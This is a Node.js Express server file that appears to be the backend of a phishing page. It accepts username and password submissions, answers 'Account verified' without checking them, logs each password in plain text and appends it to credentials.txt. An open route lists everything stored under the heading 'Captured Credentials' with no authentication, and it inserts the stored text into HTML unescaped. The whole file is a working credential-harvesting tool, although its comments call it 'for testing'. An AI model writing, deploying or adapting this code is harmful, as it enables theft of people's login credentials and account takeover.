const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = 3000;

// Middleware to parse JSON and form data
app.use(express.json()); // This is needed to parse JSON data
app.use(express.urlencoded({ extended: true }));

// Serve static files from the public directory
app.use(express.static(path.join(__dirname, 'public')));

// Route to handle form submission
app.post('/api/submit-login', (req, res) => {
    const { username, password } = req.body;

    // Check if data is received correctly
    console.log('Received data:', { username, password }); // For debugging

    const logEntry = `Username: ${username}, Password: ${password}\n`;

    // Write to a local file called credentials.txt for testing
    fs.appendFileSync(path.join(__dirname, 'credentials.txt'), logEntry);
    res.json({ message: 'Account verified' });
});

// Route to view credentials (for testing purposes only)
app.get('/api/view-credentials', (req, res) => {
    const filePath = path.join(__dirname, 'credentials.txt');

    // Check if the file exists and display its content
    if (fs.existsSync(filePath)) {
        const credentials = fs.readFileSync(filePath, 'utf-8');
        res.send(`<h2>Captured Credentials</h2><pre>${credentials}</pre>`);
    } else {
        res.send('<h2>No credentials found.</h2><p>No one has submitted credentials yet.</p>');
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});